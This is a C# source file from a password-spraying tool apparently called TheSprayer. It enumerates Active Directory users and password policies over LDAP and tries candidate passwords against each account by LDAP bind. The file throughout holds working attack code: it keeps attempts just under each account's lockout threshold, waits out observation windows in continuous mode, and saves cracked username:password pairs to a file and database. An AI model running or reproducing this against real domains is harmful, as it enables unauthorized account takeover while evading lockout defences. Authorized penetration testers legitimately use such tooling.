using System;
using System.Net;
using System.DirectoryServices.Protocols;
using TheSprayer.Models;
using System.Collections.Generic;
using TheSprayer.Extensions;
using System.Linq;
using TheSprayer.Helpers;
using System.Threading.Tasks;
using System.Threading;
using System.Security.Principal;
using System.Text;
using System.Collections.Concurrent;
using System.IO;

namespace TheSprayer.Services
{
    public class ActiveDirectoryService
    {
        private readonly SqliteService _sqlService;
        private readonly string _domain;
        private readonly string _domainUser;
        private readonly string _domainUserPass;
        private readonly string _domainController;
        private readonly string _distinguishedName;

        public ActiveDirectoryService(string domain, string domainUser, string domainUserPass, string domainController)
        {
            _domain = domain;
            _domainUser = domainUser;
            _domainUserPass = domainUserPass;
            _domainController = domainController;

            var splitDomain = _domain.Split('.');
            _distinguishedName = "";
            foreach (var split in splitDomain)
            {
                _distinguishedName += $"dc={split},";
            }
            _distinguishedName = _distinguishedName.TrimEnd(',');

            _sqlService = new SqliteService();
        }

        /// <summary>
        /// Finds all fine grained password policies
        /// </summary>
        /// <remarks>
        /// Note this usually won't find the policy unless the user is privileged.
        /// To find unknown policies see the msDS-ResultantPSO user attribute
        /// </remarks>
        public List<PasswordPolicy> GetFineGrainedPasswordPolicy()
        {
            var policies = new List<PasswordPolicy>();
            string filter = "(objectClass=msDS-PasswordSettings)";

            using var connection = CreateLdapConnection();
            var searchRequest = new SearchRequest(_distinguishedName, filter, SearchScope.Subtree);

            try
            {
                var searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                foreach (SearchResultEntry entry in searchResponse.Entries)
                {
                    var name = entry.Attributes["distinguishedName"][0].ToString();
                    var precedence = entry.Attributes.GetIfExists<int>("msds-passwordsettingsprecedence");
                    var reversibleEncryption = entry.Attributes["msds-passwordreversibleencryptionenabled"][0].ToString() == "TRUE";
                    var complexityRequired = entry.Attributes["msds-passwordcomplexityenabled"][0].ToString() == "TRUE";
                    var pwdMaxAge = Convert.ToInt64(entry.Attributes["msds-maximumpasswordage"][0]) / (double)-864000000000;
                    var pwdMinAge = Convert.ToInt64(entry.Attributes["msds-minimumpasswordage"][0]) / (double)-864000000000;
                    var pwdMinLength = Convert.ToInt32(entry.Attributes["msds-minimumpasswordlength"][0]);
                    var pwdHistoryLength = Convert.ToInt32(entry.Attributes["msds-passwordhistorylength"][0]);
                    var lockoutThreshold = Convert.ToInt32(entry.Attributes["msds-lockoutthreshold"][0]);
                    var lockoutDuration = Convert.ToInt64(entry.Attributes["msds-lockoutduration"][0]) / (double)-600000000;
                    var observationWindow = Convert.ToInt64(entry.Attributes["msds-lockoutobservationwindow"][0]) / (double)-600000000;
                    policies.Add(new PasswordPolicy()
                    {
                        Name = name,
                        Precedence = precedence,
                        PasswordMaxAge = pwdMaxAge,
                        PasswordMinAge = pwdMinAge,
                        PasswordMinLength = pwdMinLength,
                        PasswordHistoryLength = pwdHistoryLength,
                        LockoutThreshold = lockoutThreshold,
                        LockoutDuration = lockoutDuration,
                        ObservationWindow = observationWindow,
                        IsComplexityRequired = complexityRequired,
                        IsEncryptionReversible = reversibleEncryption
                    });
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
            }

            return policies;
        }

        public PasswordPolicy GetPasswordPolicy()
        {
            string filter = "(&(objectClass=domainDNS))";

            using var connection = CreateLdapConnection();            
            var searchRequest = new SearchRequest(_distinguishedName, filter, SearchScope.Subtree);

            try
            {
                var searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                var entry = searchResponse.Entries[0];
                var pwdMaxAge = Convert.ToInt64(entry.Attributes["MaxPwdAge"][0]) / (double)-864000000000;
                var pwdMinAge = Convert.ToInt64(entry.Attributes["MinPwdAge"][0]) / (double)-864000000000;
                var pwdMinLength = Convert.ToInt32(entry.Attributes["MinPwdLength"][0]);
                var pwdHistoryLength = Convert.ToInt32(entry.Attributes["PwdHistoryLength"][0]);
                var lockoutThreshold = Convert.ToInt32(entry.Attributes["LockoutThreshold"][0]);
                var lockoutDuration = Convert.ToInt64(entry.Attributes["LockoutDuration"][0]) / (double)-600000000;
                var observationWindow = Convert.ToInt64(entry.Attributes["LockoutObservationWindow"][0]) / (double)-600000000;
                var passwordProperties = (PasswordProperties)Convert.ToInt32(entry.Attributes["PwdProperties"][0]);
                var complexityRequired = (passwordProperties & PasswordProperties.DOMAIN_PASSWORD_COMPLEX) == PasswordProperties.DOMAIN_PASSWORD_COMPLEX;
                var reversibleEncryption = (passwordProperties & PasswordProperties.DOMAIN_PASSWORD_STORE_CLEARTEXT) == PasswordProperties.DOMAIN_PASSWORD_STORE_CLEARTEXT;
                return new PasswordPolicy()
                {
                    Name = "Default Password Policy",
                    Precedence = int.MaxValue,
                    PasswordMaxAge = pwdMaxAge,
                    PasswordMinAge = pwdMinAge,
                    PasswordMinLength = pwdMinLength,
                    PasswordHistoryLength = pwdHistoryLength,
                    LockoutThreshold = lockoutThreshold,
                    LockoutDuration = lockoutDuration,
                    ObservationWindow = observationWindow,
                    IsComplexityRequired = complexityRequired,
                    IsEncryptionReversible = reversibleEncryption
                };
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
                return null;
            }
        }

        // This class uses the System.DirectoryServices.Protocols namespace to retrieve domain users over LDAP. 
        // There are other options that are easier to work with but this one was chosen because it's the only one that is cross platform.
        public List<ActiveDirectoryUser> GetAllDomainUsers(IEnumerable<string> userSamAccountNames = null)
        {
            var adUsers = new List<ActiveDirectoryUser>();

            int pageCount = 0;
            // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO", "userAccountControl" };

            // Construct LDAP filter based on whether we have a list of specific users
            string filter;
            if (userSamAccountNames != null && userSamAccountNames.Any())
            {
                // Build an OR clause for each user in the list using their sAMAccountName
                var userFilterBuilder = new StringBuilder();
                userFilterBuilder.Append("(|");
                foreach (var name in userSamAccountNames)
                {
                    userFilterBuilder.AppendFormat("(sAMAccountName={0})", name);
                }
                userFilterBuilder.Append(")");
                filter = "(&(objectCategory=person)(objectClass=user)" + userFilterBuilder.ToString() + ")";
            }
            else
            {
                // LDAP Filter to get all domain users
                filter = "(&(objectCategory=person)(objectClass=user))";
            }

            // Initiate a new LDAP connection.
            using var connection = CreateLdapConnection();
            SearchRequest searchRequest = new(_distinguishedName,
                                      filter,
                                      SearchScope.Subtree,
                                      attributes);

            // Set the size of the page results. This is a heavy operation for domain controllers so paging is necessary.
            PageResultRequestControl prc = new(5000);
            SearchOptionsControl so = new(System.DirectoryServices.Protocols.SearchOption.DomainScope);
            searchRequest.Controls.Add(prc);
            searchRequest.Controls.Add(so);

            try
            {
                do
                {
                    pageCount++;
                    SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                    // Find the returned page response control and update the LDAP cookie for the next set
                    foreach (DirectoryControl control in searchResponse.Controls)
                    {
                        if (control is PageResultResponseControl resultControl)
                        {
                            // Update the page request control with the new cookie to continue paging
                            prc.Cookie = resultControl.Cookie;
                            break;
                        }
                    }

                    // Loop through every response entry
                    foreach (SearchResultEntry entry in searchResponse.Entries)
                    {
                        var sid = entry.Attributes.Contains("objectSid") && entry.Attributes["objectSid"].Count > 0
                            ? new SecurityIdentifier((byte[])entry.Attributes["objectSid"][0], 0).Value
                            : null;

                        var badPwdCount = entry.Attributes.GetIfExists<int?>("badPwdCount");
                        var lastBadPwdTime = entry.Attributes.GetIfExists<DateTime?>("badPasswordTime");
                        if (badPwdCount == null || lastBadPwdTime == null)
                        {
                            var sam = entry.Attributes.GetIfExists("sAMAccountName");
                            ColorConsole.WriteLine($"Warning: Unable to read bad password data for {sam}. Skipping user.", ConsoleColor.Yellow);
                            continue;
                        }

                        adUsers.Add(new ActiveDirectoryUser()
                        {
                            UserPrincipalName = entry.Attributes.GetIfExists("userPrincipalName"),
                            SamAccountName = entry.Attributes.GetIfExists("sAMAccountName"),
                            DistinguishedName = entry.Attributes.GetIfExists("distinguishedName"),
                            GivenName = entry.Attributes.GetIfExists("givenName"),
                            Surname = entry.Attributes.GetIfExists("sn"),
                            Description = entry.Attributes.GetIfExists("description"),
                            LastLogin = entry.Attributes.GetIfExists<DateTime?>("lastLogon"),
                            BadPasswordAttempts = badPwdCount,
                            LastBadPasswordTime = lastBadPwdTime,
                            LogonCount = entry.Attributes.GetIfExists<int>("logonCount"),
                            PasswordLastSet = entry.Attributes.GetIfExists<DateTime?>("pwdLastSet"),
                            AccountExpiry = entry.Attributes.GetIfExists<DateTime?>("accountExpires"),
                            DateCreated = entry.Attributes.GetIfExists<DateTime?>("createTimeStamp"),
                            PasswordPolicyName = entry.Attributes.GetIfExists("msDS-ResultantPSO") ?? "Default Password Policy",
                            ADsPath = entry.Attributes.GetIfExists("ADsPath"),
                            Company = entry.Attributes.GetIfExists("company"),
                            ObjectSid = sid,
                            SidHistory = entry.Attributes.GetIfExists("sIDHistory"),
                            AdminDescription = entry.Attributes.GetIfExists("adminDescription"),
                            Disabled = !IsUserActive(entry.Attributes.GetIfExists<int>("userAccountControl"))
                        });
                    }
                } while (prc.Cookie.Length != 0);
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occurred:\n\t{0}: {1}", e.GetType().Name, e.Message);
            }

            return adUsers;
        }

        public static bool IsUserActive(int userAccountControlValue)
        {
            return !Convert.ToBoolean(userAccountControlValue & 0x0002);
        }

        /// <summary>
        /// Spray a list of passwords against a set of users while keeping a buffer before lockout.
        /// </summary>
        /// <param name="passwords">Passwords to try.</param>
        /// <param name="usersToSpray">Specific users to target or <c>null</c> for all.</param>
        /// <param name="attemptsToLeave">Number of failed attempts to leave before lockout.</param>
        /// <param name="outputFile">Optional file to write valid credentials to.</param>
        /// <param name="continuous">Continue spraying after exhausting users.</param>
        /// <param name="noDb">Disable local database tracking.</param>
        /// <param name="force">Ignore safety checks and spray all users.</param>
        public async void SprayPasswords(
    IEnumerable<string> passwords,
    IEnumerable<string> usersToSpray = null,
    int attemptsToLeave = 2,
    string outputFile = null,
    bool continuous = false,
    bool noDb = false,
    bool force = false
)
        {
            var defaultPasswordPolicy = GetPasswordPolicy();
            var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
            var users = GetAllDomainUsers(usersToSpray);

            if (usersToSpray != null)
            {
                users = users.Where(u => usersToSpray.Any(u2 => u2.Equals(u.SamAccountName, StringComparison.OrdinalIgnoreCase))).ToList();
                if (!users.Any())
                {
                    Console.WriteLine("No users found that match the specified criteria, exiting!");
                    return;
                }
            }

            List<ActiveDirectoryUser> filteredUsers = new();
            if (force)
            {
                ColorConsole.WriteLine($"WARNING: All {users.Count} users will be sprayed. This could lock accounts.", ConsoleColor.Yellow);
                filteredUsers = users.ToList();
            }
            else
            {
                Console.WriteLine("Filtering out disabled and nearly locked users...");
                foreach (var user in users)
                {
                    if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                    {
                        filteredUsers.Add(user);
                    }
                }
            }

            Dictionary<string, List<CredentialAttempt>> previousSprays = new();
            if (!noDb)
            {
                previousSprays = _sqlService.GetSprayAttemptsForUsers(filteredUsers.Select(u => u.SamAccountName));
            }

            var unsavedAttempts = new ConcurrentBag<CredentialAttempt>();

            // Timer to trigger database save every 10 seconds
            var cancellationTokenSource = new CancellationTokenSource();
            var saveTask = Task.Run(async () =>
            {
                while (!cancellationTokenSource.Token.IsCancellationRequested)
                {
                    await Task.Delay(TimeSpan.FromSeconds(10));
                    SaveUnsavedAttempts(unsavedAttempts, noDb);
                }
            }, cancellationTokenSource.Token);

            try
            {
                foreach (var password in passwords)
                {
                    if (!filteredUsers.Any())
                    {
                        Console.Write($"{users.Count} users found but they are all at risk of lockout, ");
                        if (!continuous)
                        {
                            Console.WriteLine("exiting.");
                            break;
                        }
                        else
                        {
                            Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
                            await Task.Delay(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5)));

                            // Regroup users by policy and re-add those whose observation window has passed
                            filteredUsers.Clear();

                            var policyMap = fineGrainedPasswordPolicies.ToDictionary(p => p.Name);
                            policyMap["Default Password Policy"] = defaultPasswordPolicy;

                            foreach (var group in users.Where(u => !u.Disabled).GroupBy(u => u.PasswordPolicyName))
                            {
                                if (!policyMap.TryGetValue(group.Key, out var policy))
                                {
                                    continue;
                                }

                                foreach (var user in group)
                                {
                                    if (user.LastBadPasswordTime < DateTime.UtcNow.AddMinutes(-policy.ObservationWindow))
                                    {
                                        user.BadPasswordAttempts = 0;
                                    }

                                    if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                                    {
                                        filteredUsers.Add(user);
                                    }
                                }
                            }
                        }
                    }

                    var successfulCredentials = new ConcurrentBag<(string SamAccountName, string Password)>();
                    var usersToRemove = new ConcurrentBag<string>();

                    Console.WriteLine($"Trying password \"{password}\" against {filteredUsers.Count} of {users.Count} user{(users.Count > 1 ? "s" : "")}...");
                    Parallel.ForEach(
                        filteredUsers,
                        new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount },
                        user =>
                        {
                            if (!noDb && previousSprays.ContainsKey(user.SamAccountName))
                            {
                                var previousAttempt = previousSprays[user.SamAccountName].FirstOrDefault(a => a.Password == password);
                                if (previousAttempt != null)
                                {
                                    if (previousAttempt.Success)
                                    {
                                        ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
                                    }
                                    return;
                                }
                            }

                            if (TryValidateCredentials(user.SamAccountName, password))
                            {
                                ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
                                successfulCredentials.Add((user.SamAccountName, password));
                                unsavedAttempts.Add(new CredentialAttempt(user.SamAccountName, password, true));
                            }
                            else
                            {
                                unsavedAttempts.Add(new CredentialAttempt(user.SamAccountName, password, false));
                                user.BadPasswordAttempts = (user.BadPasswordAttempts ?? 0) + 1;
                                user.LastBadPasswordTime = DateTime.UtcNow;

                                if (!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                                {
                                    usersToRemove.Add(user.SamAccountName);
                                }
                            }
                        }
                    );

                    filteredUsers = filteredUsers.Where(u => !usersToRemove.Contains(u.SamAccountName)).ToList();

                    if (!string.IsNullOrWhiteSpace(outputFile) && successfulCredentials.Count > 0)
                    {
                        lock (outputFile)
                        {
                            using var sw = new StreamWriter(outputFile, append: true);
                            foreach (var credential in successfulCredentials)
                            {
                                sw.WriteLine($"{credential.SamAccountName}:{credential.Password}");
                            }
                        }
                    }
                }
            }
            finally
            {
                cancellationTokenSource.Cancel();
                saveTask.Wait();
                SaveUnsavedAttempts(unsavedAttempts, noDb);
            }
        }

        private void SaveUnsavedAttempts(ConcurrentBag<CredentialAttempt> unsavedAttempts, bool noDb)
        {
            if (noDb) return;

            var attemptsToSave = new List<CredentialAttempt>();
            while (unsavedAttempts.TryTake(out var attempt))
            {
                attemptsToSave.Add(attempt);
            }

            if (attemptsToSave.Any())
            {
                _sqlService.BulkSaveCredentialPairs(attemptsToSave);
            }
        }

        /// <summary>
        /// Determine if a user should be included in the spray based on lockout thresholds.
        /// </summary>
        /// <param name="user">User being evaluated.</param>
        /// <param name="defaultPasswordPolicy">The domain's default password policy.</param>
        /// <param name="fineGrainedPasswordPolicies">Any fine-grained password policies.</param>
        /// <param name="attemptsToLeave">Number of attempts to keep before lockout.</param>
        public static bool ShouldSprayUser(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
        {
            var policyName = user.PasswordPolicyName;
            PasswordPolicy policy;
            if (policyName == "Default Password Policy")
            {
                policy = defaultPasswordPolicy;
            }
            else
            {
                policy = fineGrainedPasswordPolicies.FirstOrDefault(p => p.Name == policyName);
            }

            if (user.Disabled)
            {
                return false;
            }

            if (user.BadPasswordAttempts == null || user.LastBadPasswordTime == null)
            {
                ColorConsole.WriteLine($"Warning: Insufficient permissions to read lockout details for {user.SamAccountName}. Skipping user.", ConsoleColor.Yellow);
                return false;
            }

            if (policy == null) // Fine grained policy that we can't see :(
            {
                // Fine grained password policy detected but not readable, skipping user.
                return false;
            }
            else if (policy.LockoutThreshold == 0) //We can go forever :D
            {
                // Spraying {user.SamAccountName}. No lockout limits.
                return true;
            }
            else
            {
                var remainingAttempts = policy.LockoutThreshold - user.BadPasswordAttempts.Value;
                if (remainingAttempts > attemptsToLeave)
                {
                    // Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}
                    return true;
                }
                else if (user.LastBadPasswordTime < DateTime.UtcNow.AddMinutes(-1 * policy.ObservationWindow))
                {
                    // User hasn't had an incorrect password in at least the observation window, we can try again
                    return true;
                }
                else
                {
                    // User is too close to being locked, skipping.
                    return false;
                }
            }
        }

        public bool TryValidateCredentials(string username, string password)
        {
            using var connection = new LdapConnection(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            connection.Credential = new NetworkCredential(username, password, _domain);

            try
            {
                connection.Bind();
                return true;
            }
            catch (LdapException)
            {
                return false;
            }
        }

        private LdapConnection CreateLdapConnection()
        {
            var connection = new LdapConnection(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            if (!string.IsNullOrWhiteSpace(_domainUser) && !string.IsNullOrWhiteSpace(_domainUserPass))
            {
                connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
            }
            return connection;
        }
    }
}